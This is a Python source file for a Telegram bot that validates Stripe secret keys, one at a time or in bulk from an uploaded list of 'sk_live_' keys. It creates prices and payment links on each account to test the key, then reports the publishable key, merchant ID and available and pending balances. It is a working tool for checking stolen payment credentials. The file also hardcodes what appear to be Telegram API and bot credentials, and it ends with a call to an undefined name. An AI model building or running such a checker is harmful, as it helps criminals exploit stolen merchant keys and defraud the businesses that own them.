from pyrogram import Client, filters
import requests
import time

app = Client("stripe_checker_bot", api_id="26041207", api_hash="2671d905a324ed22e179d8f03354ab09", bot_token="7168368998:AAGrG2e76-uMSy91beyPC6T61iIQoBe6NYQ")


BASE_URL = "https://api.stripe.com/v1"

def retrieve_publishable_key_and_merchant(secret_key):
    price_url = f"{BASE_URL}/prices"
    headers = {"Authorization": f"Bearer {secret_key}"}
    price_data = {
        "currency": "usd",
        "unit_amount": 1000,
        "product_data[name]": "Gold Plan"
    }
    
    price_res = requests.post(price_url, headers=headers, data=price_data)
    
    if price_res.status_code != 200:
        error_code = price_res.json().get('error', {}).get('code', '')
        if error_code == 'api_key_expired':
            return None
        return None

    price_id = price_res.json()["id"]

    payment_link_url = f"{BASE_URL}/payment_links"
    payment_link_data = {
        "line_items[0][quantity]": 1,
        "line_items[0][price]": price_id
    }
    
    payment_link_res = requests.post(payment_link_url, headers=headers, data=payment_link_data)
    if payment_link_res.status_code != 200:
        return None

    payment_link = payment_link_res.json()["url"]
    payment_link_id = payment_link.split("/")[-1]

    merchant_ui_api_url = f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}"
    merchant_res = requests.get(merchant_ui_api_url)
    
    if merchant_res.status_code != 200:
        return None
    
    merchant_data = merchant_res.json()
    publishable_key = merchant_data.get("key")
    
    return publishable_key

def get_account_info(secret_key):
    url = f"{BASE_URL}/account"
    headers = {"Authorization": f"Bearer {secret_key}"}
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        account = response.json()
        balance_url = f"{BASE_URL}/balance"
        balance_response = requests.get(balance_url, headers=headers)
        if balance_response.status_code == 200:
            balance_data = balance_response.json()
            available_balance = balance_data['available'][0]['amount'] / 100 if balance_data['available'] else 0
            pending_balance = balance_data['pending'][0]['amount'] / 100 if balance_data['pending'] else 0
        else:
            available_balance = "N/A"
            pending_balance = "N/A"
        
        return {
            "account_id": account['id'],
            "business_name": account['business_profile'].get('name', 'N/A'),
            "email": account.get('email', 'N/A'),
            "country": account.get('country', 'N/A'),
            "default_currency": account.get('default_currency', 'N/A'),
            "charges_enabled": account.get('charges_enabled', False),
            "payouts_enabled": account.get('payouts_enabled', False),
            "available_balance": available_balance,
            "pending_balance": pending_balance
        }
    return {}

@app.on_message(filters.command(["sk", ".sk"]) & filters.private)
async def check_sk(client, message):
    sk = message.text.split(" ", 1)[1] if len(message.text.split(" ", 1)) > 1 else None
    if not sk:
        await message.reply_text("Please provide a Stripe Secret Key.", reply_to_message_id=message.id)
        return

    publishable_key = retrieve_publishable_key_and_merchant(sk)
    if publishable_key is None:
        await message.reply_text(
            f"[ϟ] 𝗦𝗞 ➜ {sk}\n[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗗𝗲𝗮𝗱 𝗞𝗲𝘆 ❌\n[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ {message.from_user.mention}",
            reply_to_message_id=message.id
        )
    else:
        account_info = get_account_info(sk)
        response_text = (
            "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n\n"
            f"[ϟ] 𝗦𝗞 ➜ {sk}\n"
            f"[ϟ] 𝗣𝘂𝗯𝗹𝗶𝘀𝗵𝗮𝗯𝗹𝗲 𝗞𝗲𝘆 ➜ {publishable_key}\n"
            f"[ϟ] 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 ➜ {account_info.get('account_id')}\n"
            "[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n"
            f"[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 ➜ {account_info.get('default_currency')}\n"
            f"[ϟ] 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ➜ ${account_info.get('available_balance')}\n"
            f"[ϟ] 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ➜ ${account_info.get('pending_balance')}\n"
            f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ {message.from_user.mention}"
        )
        await message.reply_text(response_text, reply_to_message_id=message.id)

@app.on_message(filters.command(["sktxt", ".sktxt"]) & filters.private & filters.reply)
async def check_sk_from_file(client, message):
    if not message.reply_to_message.document:
        await message.reply_text("Please reply to a text file containing Stripe Secret Keys.", reply_to_message_id=message.id)
        return
    
    doc = await client.download_media(message.reply_to_message.document)
    with open(doc, "r") as f:
        keys = [line.strip() for line in f if line.strip().startswith("sk_live_")]

    total_keys = len(keys)
    live_count = 0
    checked_count = 0

    status_message = await message.reply_text(
        f"ᴍᴀss sᴋ ᴄ𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
        f"SK Amount ➜ {total_keys}\n"
        f"Live ➜ 0\nChecked ➜ 0\nStatus ➜ Processing\n\n"
        f"ᴄ𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 ➜ {message.from_user.mention}",
        reply_to_message_id=message.id
    )

    for sk in keys:
        publishable_key = retrieve_publishable_key_and_merchant(sk)
        checked_count += 1

        if publishable_key:
            live_count += 1
            account_info = get_account_info(sk)
            live_key_text = (
                "𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n\n"
                f"[ϟ] 𝗦𝗞 ➜ {sk}\n"
                f"[ϟ] 𝗣𝘂𝗯𝗹𝗶𝘀𝗵𝗮𝗯𝗹𝗲 𝗞𝗲𝘆 ➜ {publishable_key}\n"
                f"[ϟ] 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 ➜ {account_info.get('account_id')}\n"
                "[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ 𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅\n"
                f"[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 ➜ {account_info.get('default_currency')}\n"
                f"[ϟ] 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ➜ ${account_info.get('available_balance')}\n"
                f"[ϟ] 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ➜ ${account_info.get('pending_balance')}\n"
                f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ {message.from_user.mention}"
            )
            await message.reply_text(live_key_text, reply_to_message_id=message.id)  # Send each live key as a reply

        if checked_count % 10 == 0 or checked_count == total_keys:
            await status_message.edit_text(
                f"ᴍᴀss sᴋ ᴄ𝗵𝗲𝗰𝗸𝗲𝗿\n\n"
                f"SK Amount ➜ {total_keys}\n"
                f"Live ➜ {live_count}\nChecked ➜ {checked_count}\n"
                f"Status ➜ {'Processing' if checked_count < total_keys else 'Completed'}\n\n"
                f"ᴄ𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 ➜ {message.from_user.mention}"
            )

if __name__ == "__main__":
    app.run(Demon)
